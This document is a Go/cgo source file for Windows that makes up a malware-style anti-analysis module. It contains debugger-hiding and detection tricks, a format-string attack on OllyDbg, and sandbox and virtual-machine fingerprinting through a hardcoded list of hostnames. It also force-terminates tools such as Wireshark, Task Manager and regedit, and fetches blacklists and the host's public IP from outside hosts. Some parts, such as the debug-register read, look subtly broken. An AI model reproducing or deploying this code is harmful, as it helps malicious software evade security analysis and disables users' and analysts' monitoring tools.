package main

/*
#include <windows.h>
#include <winternl.h>
#include <process.h>

// Anti-debugging function to hide the current thread from the debugger
typedef NTSTATUS(WINAPI *NtSetInformationThread)(IN HANDLE, IN THREADINFOCLASS, IN PVOID, IN ULONG);

void hideThreadFromDebugger() {
    NtSetInformationThread pNtSetInformationThread = (NtSetInformationThread)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetInformationThread");
    if (pNtSetInformationThread != NULL) {
        THREADINFOCLASS ThreadHideFromDebugger = (THREADINFOCLASS)0x11;
        pNtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);
    }
}

// System requirements check
BOOL checkSystemRequirements() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return FALSE;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = (DWORD)(memoryStatus.ullTotalPhys / (1024 * 1024));
    if (RAMMB < 2048) return FALSE;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        CloseHandle(hDevice);
        return FALSE;
    }

    DWORD diskSizeGB = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / (1024 * 1024 * 1024));
    CloseHandle(hDevice);
    if (diskSizeGB < 100) return FALSE;

    return TRUE;
}

ULONGLONG GetTickCount64();
*/

import "C"
import (
    "fmt"
    "syscall"
    "unsafe"
    "os/exec"
    "os"
    "strings"
    "encoding/json"
    "io/ioutil"
    "net/http"
    "log"
)

var (
    user32DLL   = syscall.NewLazyDLL("user32.dll")
    enumWindowsProc = user32DLL.NewProc("EnumWindows")
    getWindowTextProc = user32DLL.NewProc("GetWindowTextA")
    getWindowThreadProcessIdProc = user32DLL.NewProc("GetWindowThreadProcessId")

    kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
    openProcessProc = kernel32DLL.NewProc("OpenProcess")
    terminateProcessProc = kernel32DLL.NewProc("TerminateProcess")
    closeHandleProc = kernel32DLL.NewProc("CloseHandle")
    isDebuggerPresentProc = kernel32DLL.NewProc("IsDebuggerPresent")
    checkRemoteDebuggerPresentProc = kernel32DLL.NewProc("CheckRemoteDebuggerPresent")
    enumProcessesProc = kernel32DLL.NewProc("K32EnumProcesses")

    ntdllDLL = syscall.NewLazyDLL("ntdll.dll")
    ntCloseProc = ntdllDLL.NewProc("NtClose")
    createMutexProc = kernel32DLL.NewProc("CreateMutexA")
    setHandleInformationProc = kernel32DLL.NewProc("SetHandleInformation")
    
    handleFlagProtectFromClose = uint32(0x00000002)

    kernel32Module             = syscall.MustLoadDLL("kernel32.dll")
    outputDebugStringProc   = kernel32Module.MustFindProc("OutputDebugStringA")
    getLastErrorProc         = kernel32Module.MustFindProc("GetLastError")
)

// Hide the current thread from the debugger
func hideThreadFromDebugger() {
    C.hideThreadFromDebugger()
}

// Detects if NtClose is called on an invalid handle
func NtCloseAntiDebug_InvalidHandle() bool {
    r1, _, _ := ntCloseProc.Call(uintptr(0x1231222))
    return r1 != 0
}

// Detects if NtClose is called on a protected handle
func NtCloseAntiDebug_ProtectedHandle() bool {
    r1, _, _ := createMutexProc.Call(0, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fmt.Sprintf("%d", 1234567)))))
    hMutex := uintptr(r1)
    r1, _, _ = setHandleInformationProc.Call(hMutex, uintptr(handleFlagProtectFromClose), uintptr(handleFlagProtectFromClose))
    if r1 == 0 {
        return false
    }
    r1, _, _ = ntCloseProc.Call(hMutex)
    return r1 != 0
}

// Detects if hardware breakpoints are set
func detectHardwareBreakpoints() bool {
    const CONTEXT_DEBUG_REGISTERS = 0x00010000 | 0x00000010
    var context C.CONTEXT
    context.ContextFlags = C.CONTEXT_DEBUG_REGISTERS
    if C.GetThreadContext(C.GetCurrentThread(), &context) != 0 {
        if context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0 || context.Dr7 != 0 {
            return true
        }
        dr := *(*[2]C.ULONG_PTR)(unsafe.Pointer(&context.R8)) 
        if dr[0] != 0 || dr[1] != 0 {
            return true
        }
    }
    return false
}

// Uses OutputDebugString to detect debuggers
func detectDebuggerWithOutputDebugString() bool {
    testString := "debugging"
    txptr, _ := syscall.UTF16PtrFromString(testString)
    outputDebugStringProc.Call(uintptr(unsafe.Pointer(txptr)))
    ret, _, _ := getLastErrorProc.Call()
    return ret == 0
}

// Exploit OllyDbg with a formatted string
func exploitOllyDbg(formatString string) {
    txptr, err := syscall.UTF16PtrFromString(formatString)
    if err != nil {
        panic(err)
    }
    outputDebugStringProc.Call(uintptr(unsafe.Pointer(txptr)))
}

func main() {
    logFile, err := os.OpenFile("anti_debugger_log.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    if err != nil {
        fmt.Println("Could not open log file:", err)
        return
    }
    defer logFile.Close()

    log.SetOutput(logFile)
    log.Println("Starting anti-debugger script")

    // Hide the current thread from the debugger
    hideThreadFromDebugger()

    for {
        // Detect debugger using OutputDebugString
        if detectDebuggerWithOutputDebugString() {
            log.Println("Debugger detected with OutputDebugString")
            os.Exit(1)
        }

        // Exploit OllyDbg
        exploitOllyDbg("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")

        // Detect hardware breakpoints
        if detectHardwareBreakpoints() {
            log.Println("Hardware breakpoints detected")
            os.Exit(1)
        }

        // Detect invalid and protected handle closures
        if NtCloseAntiDebug_InvalidHandle() || NtCloseAntiDebug_ProtectedHandle() {
            log.Println("Invalid or protected handle closure detected")
            os.Exit(1)
        }

        // Check if a debugger is present
        isDebuggerPresentFlag, _, _ := isDebuggerPresentProc.Call()
        if isDebuggerPresentFlag != 0 {
            log.Println("Debugger detected with IsDebuggerPresent")
            os.Exit(-1)
        }

        // Check if a remote debugger is present
        var isRemoteDebuggerPresent bool
        checkRemoteDebuggerPresentProc.Call(^uintptr(0), uintptr(unsafe.Pointer(&isRemoteDebuggerPresent)))
        if isRemoteDebuggerPresent {
            log.Println("Remote debugger detected")
            os.Exit(-1)
        }

        // Check for GPU information indicating a virtual machine
        if checkGPU() {
            log.Println("Virtual machine GPU detected")
            syscall.Exit(-1)
        }

        log.Println("GPU check passed")

        // Check if the PC name matches known virtual machine names
        if checkPCName() {
            log.Println("Blacklisted PC name detected")
            os.Exit(-1)
        }

        log.Println("PC Name check passed")

        // Check system uptime
        if checkSystemUptime() < 1200 {
            log.Println("System uptime too low")
            os.Exit(-1)
        } else {
            log.Println("System uptime check passed")
        }

        // Check system requirements
        if C.checkSystemRequirements() == 1 {
            log.Println("System requirements check passed")
        } else {
            log.Println("System requirements not met")
            os.Exit(-1)
        }

        // Check running processes
        if checkRunningProcesses() < 50 {
            log.Println("Not enough running processes")
            os.Exit(-1)
        }

        // Terminate blacklisted processes
        terminateBlacklistedProcesses()

        // Check for blacklisted window names
        checkBlacklistedWindows()

        // Perform IP check against a blacklist
        if checkBlacklistedIP() {
            log.Println("Blacklisted IP detected")
            os.Exit(-1)
        }

        log.Println("All checks passed")
        break
    }
}

// Check if the GPU information indicates a virtual machine
func checkGPU() bool {
    gpuBlacklistURL := "https://rentry.co/povewdm6/raw"
    gpuBlacklistCmd := exec.Command("curl", gpuBlacklistURL)
    output, _ := gpuBlacklistCmd.Output()

    gpuBlacklist := string(output)
    output, _ = exec.Command("cmd", "/C", "wmic path win32_videocontroller get name").Output()
    gpuName := strings.TrimSpace(strings.Split(string(output), "\n")[1])

    return strings.Contains(gpuBlacklist, gpuName)
}

// Check if the PC name matches known virtual machine names
func checkPCName() bool {
    blacklistedPCNames := []string{"00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP", "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8", "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX", "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO", "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN", "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM", "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9", "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O", "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P", "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK", "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS", "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5", "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI", "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL", "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL", "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC", "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WINZDS-MILOBM35", "WINZDS-PU0URPVI", "ABIGAI", "JUANYARO", "floppy", "CATWRIGHT", "llc"}

    pcName, _ := os.Hostname()

    for _, badName := range blacklistedPCNames {
        if strings.Contains(pcName, badName) {
            return true
        }
    }
    return false
}

// Check the system uptime
func checkSystemUptime() uint64 {
    return uint64(C.GetTickCount64()) / 1000
}

// Check the number of running processes
func checkRunningProcesses() int {
    var processIDs [1024]uint32
    var bytesReturned uint32

    enumProcessesProc.Call(uintptr(unsafe.Pointer(&processIDs)), uintptr(len(processIDs)), uintptr(unsafe.Pointer(&bytesReturned)))

    return int(bytesReturned / 4)
}

// Terminate blacklisted processes
func terminateBlacklistedProcesses() {
    blacklistedProcesses := []string{"cmd.exe", "taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe", "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe"}

    for _, processName := range blacklistedProcesses {
        exec.Command("taskkill", "/F", "/IM", processName).Run()
    }
}

// Check for blacklisted window names
func checkBlacklistedWindows() {
    enumWindowsCallback := syscall.NewCallback(enumWindowsProcCallback)
    enumWindowsProc.Call(enumWindowsCallback, 0)
}

func enumWindowsProcCallback(hwnd uintptr, lParam uintptr) uintptr {
    var processID uint32
    getWindowThreadProcessIdProc.Call(hwnd, uintptr(unsafe.Pointer(&processID)))

    var windowTitle [256]byte
    getWindowTextProc.Call(hwnd, uintptr(unsafe.Pointer(&windowTitle)), 256)
    title := string(windowTitle[:])

    blacklistedWindowTitles := []string{
        "proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy",
        "titanHide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly",
        "process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor",
        "debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded",
        "dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza",
        "crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark",
        "debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper",
        "petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox",
        "dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg",
        "httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom",
        "mdbg", "WPE PRO", "system explorer", "de4dot", "X64NetDumper", "protection_id",
        "charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd",
        "0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker",
        "harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice",
        "folder", "mitmproxy", "dbx", "sniffer", "Process Hacker",
    }

    for _, blacklistedTitle := range blacklistedWindowTitles {
        if strings.Contains(title, blacklistedTitle) {
            processHandle, _, _ := openProcessProc.Call(syscall.PROCESS_TERMINATE, 0, uintptr(processID))
            if processHandle != 0 {
                terminateProcessProc.Call(processHandle, 0)
                closeHandleProc.Call(processHandle)
            }
            syscall.Exit(0)
        }
    }

    return 1
}

// Check blacklisted IPs
func checkBlacklistedIP() bool {
    ipBlacklistURL := "https://rentry.co/hikbicky/raw"
    ipBlacklistCmd := exec.Command("curl", ipBlacklistURL)
    output, _ := ipBlacklistCmd.Output()

    ipBlacklist := strings.Split(strings.TrimSpace(string(output)), "\n")
    currentIP, _ := exec.Command("curl", "https://api.ipify.org/?format=text").Output()

    for _, blacklistedIP := range ipBlacklist {
        if strings.TrimSpace(string(currentIP)) == blacklistedIP {
            return true
        }
    }
    return false
}
